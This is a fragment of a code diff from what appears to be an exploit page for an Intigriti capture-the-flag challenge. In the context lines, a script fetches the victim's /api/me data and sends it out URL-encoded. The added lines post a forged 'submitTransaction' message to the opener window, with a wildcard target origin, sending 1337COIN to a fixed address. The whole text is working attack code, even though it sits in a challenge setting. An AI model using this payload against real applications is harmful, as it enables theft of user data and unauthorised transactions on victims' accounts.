@@ -20,6 +20,15 @@ fetch("https://challenge-0126.intigriti.io/api/me", {
         body: "data= " + encodeURIComponent(d)
     });
 });
+
+      window.opener.postMessage({
+  type: 'submitTransaction',
+  transaction: {
+    currency: '1337COIN',
+    amount: 10,
+    toAddress: '17d95bbc59cc74a0c5344f8d81c777ccd5'
+  }
+}, '*');
     </script>
 
   </body>
